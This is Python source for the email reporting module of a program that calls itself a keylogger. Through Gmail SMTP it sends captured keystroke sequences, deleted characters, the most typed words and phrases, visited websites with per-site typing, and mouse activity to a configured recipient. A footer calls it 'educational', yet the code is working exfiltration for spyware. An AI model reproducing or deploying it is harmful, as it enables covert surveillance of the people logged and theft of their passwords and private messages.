"""
Email reporting module for KeyLogger
Sends session reports via email
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

class EmailReporter:
    """Handles sending session reports via email"""

    def __init__(self, email_address, app_password, smtp_server='smtp.gmail.com', smtp_port=587):
        """
        Initialize email reporter

        Args:
            email_address (str): Gmail address to send from
            app_password (str): Gmail app-specific password
            smtp_server (str): SMTP server address
            smtp_port (int): SMTP port
        """
        self.email_address = email_address
        self.app_password = app_password
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port

    def send_session_report(self, recipient, session_data, patterns):
        """
        Send session report via email

        Args:
            recipient (str): Email address to send to
            session_data (dict): Session data including events
            patterns (dict): Analyzed patterns

        Returns:
            bool: True if sent successfully
        """
        try:
            if not self.app_password:
                print("[-] Email password not configured. Skipping email report.")
                print("[!] Set EMAIL_PASSWORD environment variable to enable email reports")
                logger.warning("Email password not configured")
                return False

            # Create email message
            msg = MIMEMultipart()
            msg['From'] = self.email_address
            msg['To'] = recipient
            msg['Subject'] = f"KeyLogger Session Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            # Build email body
            body = self._build_email_body(session_data, patterns)
            msg.attach(MIMEText(body, 'html'))

            # Send email
            print(f"[*] Connecting to Gmail SMTP server...")
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()

            print(f"[*] Authenticating with Gmail...")
            server.login(self.email_address, self.app_password)

            print(f"[*] Sending report to {recipient}...")
            server.send_message(msg)
            server.quit()

            print(f"[+] Session report sent successfully to {recipient}")
            logger.info(f"Session report sent to {recipient}")
            return True

        except smtplib.SMTPAuthenticationError:
            print("[-] Gmail authentication failed. Check app-specific password.")
            logger.error("Gmail authentication failed")
            return False
        except smtplib.SMTPException as e:
            print(f"[-] SMTP error occurred: {e}")
            logger.error(f"SMTP error: {e}")
            return False
        except Exception as e:
            print(f"[-] Error sending email: {e}")
            logger.error(f"Error sending email: {e}")
            return False

    def _build_email_body(self, session_data, patterns):
        """
        Build HTML email body with session report

        Args:
            session_data (dict): Session data
            patterns (dict): Analyzed patterns

        Returns:
            str: HTML formatted email body
        """
        # Extract data
        mouse_events = len([e for e in session_data.get('events', []) if e['type'].startswith('mouse')])
        keyboard_events = len([e for e in session_data.get('events', []) if e['type'].startswith('key')])
        session_duration = session_data.get('duration_seconds', 0)

        # Build HTML
        html = f"""
        <html>
        <head>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                h1 {{ color: #333; }}
                h2 {{ color: #666; margin-top: 20px; }}
                .stat {{ margin: 10px 0; padding: 10px; background: #f0f0f0; border-left: 4px solid #4CAF50; }}
                .stat-label {{ font-weight: bold; }}
                table {{ border-collapse: collapse; width: 100%; margin-top: 10px; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #4CAF50; color: white; }}
                .warning {{ color: #ff9800; }}
            </style>
        </head>
        <body>
            <h1>KeyLogger Session Report</h1>

            <div class="stat">
                <span class="stat-label">Session Started:</span> {session_data.get('start_time', 'N/A')}
            </div>

            <div class="stat">
                <span class="stat-label">Session Duration:</span> {session_duration:.2f} seconds
            </div>

            <h2>Session Summary (AI-Generated)</h2>
            <div style="background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 10px 0; line-height: 1.6;">
                <p>{session_data.get('ai_summary', 'AI summary not available').replace(chr(10), '<br>')}</p>
            </div>

            <h2>Input Summary</h2>
            <div class="stat">
                <span class="stat-label">Keyboard Events Captured:</span> {keyboard_events}
            </div>
            <div class="stat">
                <span class="stat-label">Mouse Events Captured:</span> {mouse_events}
            </div>

            <h2>Keyboard Input Sequence</h2>
        """

        # Show input statistics
        input_stats = session_data.get('input_statistics', {})
        if input_stats:
            html += f"""
            <div class="stat">
                <span class="stat-label">Total Key Presses:</span> {input_stats.get('total_keys', 0)}
            </div>
            <div class="stat">
                <span class="stat-label">Letters Pressed:</span> {input_stats.get('letters_pressed', 0)} |
                Numbers: {input_stats.get('numbers_pressed', 0)} |
                Spaces: {input_stats.get('spaces_pressed', 0)} |
                Special Keys: {input_stats.get('special_keys_pressed', 0)} |
                Backspaces: {input_stats.get('backspaces_pressed', 0)}
            </div>
            """

        # Show keyboard input sequence (first 150 for brevity)
        input_seq = session_data.get('input_sequence', [])
        if input_seq:
            html += "<h3>Complete Key Press Sequence (first 150):</h3><table style='font-size: 10px;'><tr><th>#</th><th>Type</th><th>Key</th><th>Details</th></tr>"
            for entry in input_seq[:150]:
                key_type = entry.get('type', 'UNKNOWN')
                display = entry.get('display', '?')
                seq_num = entry.get('sequence', '?')

                # Determine description
                if key_type == 'LETTER':
                    desc = f"Letter '{display}'"
                elif key_type == 'NUMBER':
                    desc = f"Number '{display}'"
                elif key_type == 'SPACE':
                    desc = "Space pressed"
                elif key_type == 'BACKSPACE':
                    if entry.get('deleted_char'):
                        desc = f"Deleted '{entry['deleted_char']}'"
                    else:
                        desc = "Backspace"
                elif key_type == 'SPECIAL':
                    desc = f"{display}"
                else:
                    desc = display

                html += f"<tr><td>{seq_num}</td><td>{key_type}</td><td>{display}</td><td>{desc}</td></tr>"
            html += "</table>"

            if len(input_seq) > 150:
                html += f"<p><em>... and {len(input_seq) - 150} more key presses (full sequence stored in database)</em></p>"
        else:
            html += "<p><em>No keyboard input detected.</em></p>"

        html += """
            <h2>Keyboard Analysis</h2>
        """

        kb = patterns.get('keyboard_patterns', {})
        if kb:
            html += f"""
            <div class="stat">
                <span class="stat-label">Total Keys Pressed:</span> {kb.get('total_keys_pressed', 0)}
            </div>
            <div class="stat">
                <span class="stat-label">Unique Keys:</span> {kb.get('unique_keys', 0)}
            </div>
            """

        typing = patterns.get('typing_speed', {})
        if typing:
            html += f"""
            <div class="stat">
                <span class="stat-label">Estimated Typing Speed (WPM):</span> {typing.get('estimated_wpm', 0)}
            </div>
            <div class="stat">
                <span class="stat-label">Average Keystroke Interval:</span> {typing.get('avg_keystroke_interval_ms', 0)}ms
            </div>
            """

        mouse = patterns.get('mouse_patterns', {})
        if mouse:
            html += f"""
            <h2>Mouse Movement Analysis</h2>
            <div class="stat">
                <span class="stat-label">Direction Changes:</span> {mouse.get('total_direction_changes', 0)}
            </div>
            <div class="stat">
                <span class="stat-label">Most Common Direction:</span> {mouse.get('most_common_direction', 'N/A')}
            </div>
            <div class="stat">
                <span class="stat-label">Total Movement Time:</span> {mouse.get('total_movement_time_ms', 0):.0f}ms
            </div>
            """

        clicks = patterns.get('click_patterns', {})
        if clicks:
            html += f"""
            <h2>Mouse Click Analysis</h2>
            <div class="stat">
                <span class="stat-label">Total Clicks:</span> {clicks.get('total_clicks', 0)}
            </div>
            <div class="stat">
                <span class="stat-label">Most Used Button:</span> {clicks.get('most_common_button', 'N/A')}
            </div>
            """

        # AI Summary Section
        ai_summary = session_data.get('ai_summary', '')
        if ai_summary:
            html += f"""
            <h2>Session Summary (AI-Generated)</h2>
            <div style="background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 10px 0;">
                <p>{ai_summary.replace(chr(10), '<br>')}</p>
            </div>
            """

        # Special Keys Analysis
        special = patterns.get('special_keys', {})
        if special and special.get('total_special_keys', 0) > 0:
            html += f"""
            <h2>Special Keys Pressed</h2>
            <div class="stat">
                <span class="stat-label">Total Special Key Presses:</span> {special.get('total_special_keys', 0)}
            </div>
            <div class="stat">
                <span class="stat-label">Unique Special Keys:</span> {special.get('unique_special_keys', 0)}
            </div>
            """
            special_freq = special.get('most_common_special_keys', {})
            if special_freq:
                html += "<h3>Most Used Special Keys:</h3><table><tr><th>Key</th><th>Count</th></tr>"
                for key, count in list(special_freq.items())[:10]:
                    html += f"<tr><td>{key}</td><td>{count}</td></tr>"
                html += "</table>"

        # Words Analysis
        words = patterns.get('word_patterns', {})
        if words and words.get('total_words_typed', 0) > 0:
            html += f"""
            <h2>Most Common Words Typed</h2>
            <div class="stat">
                <span class="stat-label">Total Words Typed:</span> {words.get('total_words_typed', 0)}
            </div>
            <div class="stat">
                <span class="stat-label">Unique Words:</span> {words.get('unique_words', 0)}
            </div>
            """
            most_common = words.get('most_common_words', {})
            html += "<h3>Top 15 Most Typed Words:</h3><table><tr><th>#</th><th>Word</th><th>Count</th></tr>"
            if most_common:
                word_list = list(most_common.items())
                for i in range(15):
                    if i < len(word_list):
                        word, count = word_list[i]
                        html += f"<tr><td>{i+1}</td><td>{word}</td><td>{count}</td></tr>"
                    else:
                        html += f"<tr><td>{i+1}</td><td>-</td><td>-</td></tr>"
            else:
                for i in range(15):
                    html += f"<tr><td>{i+1}</td><td>-</td><td>-</td></tr>"
            html += "</table>"
        else:
            html += """
            <h2>Words Typed</h2>
            <p><em>No words were typed during this session.</em></p>
            """

        # Phrases Analysis
        phrases = patterns.get('phrase_patterns', {})
        html += """
            <h2>Phrases Detected</h2>
            """

        two_word = phrases.get('most_common_2word', {}) if phrases else {}
        three_word = phrases.get('most_common_3word', {}) if phrases else {}

        if two_word:
            html += "<h3>2-Word Phrases (typed 2+ times):</h3><table><tr><th>Phrase</th><th>Count</th></tr>"
            for phrase, count in list(two_word.items())[:10]:
                html += f"<tr><td>{phrase}</td><td>{count}</td></tr>"
            html += "</table>"
        else:
            html += "<p><em>No meaningful 2-word phrases detected (need at least 2 occurrences).</em></p>"

        if three_word:
            html += "<h3>3-Word Phrases (typed 2+ times):</h3><table><tr><th>Phrase</th><th>Count</th></tr>"
            for phrase, count in list(three_word.items())[:10]:
                html += f"<tr><td>{phrase}</td><td>{count}</td></tr>"
            html += "</table>"
        else:
            html += "<p><em>No meaningful 3-word phrases detected (need at least 2 occurrences).</em></p>"

        # Websites Analysis with Per-Website Activity
        sites = patterns.get('website_visits', {})
        html += """
            <h2>Websites Visited</h2>
            """

        # Show websites visited from session_data if available (more accurate)
        if session_data.get('websites_visited'):
            websites = session_data.get('websites_visited', [])
            website_activities = session_data.get('website_activities', {})

            if websites:
                html += f"<div class='stat'><span class='stat-label'>Total Websites Visited:</span> {len(websites)}</div>"
                html += "<h3>Websites Visited (in order):</h3><table><tr><th>#</th><th>Website</th><th>Words Typed</th><th>Unique Words</th></tr>"

                for i, website in enumerate(websites):
                    if website in website_activities:
                        activity = website_activities[website]
                        html += f"<tr><td>{i+1}</td><td>{website}</td><td>{activity.get('total_words_typed', 0)}</td><td>{activity.get('unique_words', 0)}</td></tr>"
                    else:
                        html += f"<tr><td>{i+1}</td><td>{website}</td><td>-</td><td>-</td></tr>"

                html += "</table>"
            else:
                html += "<p><em>No websites tracked.</em></p>"
        elif sites and sites.get('unique_urls', 0) > 0:
            html += f"""
            <div class="stat">
                <span class="stat-label">Total Unique URLs:</span> {sites.get('unique_urls', 0)}
            </div>
            """
            domains = sites.get('most_visited_domains', {})
            if domains:
                html += "<h3>Most Visited Domains:</h3><table><tr><th>Domain</th><th>Visits</th></tr>"
                for domain, count in list(domains.items())[:10]:
                    html += f"<tr><td>{domain}</td><td>{count}</td></tr>"
                html += "</table>"
        else:
            html += "<p><em>No websites tracked.</em></p>"

        html += """
            <p style="color: #999; font-size: 12px; margin-top: 30px;">
                <em>This is an automated report from KeyLogger educational application.</em>
            </p>
        </body>
        </html>
        """

        return html
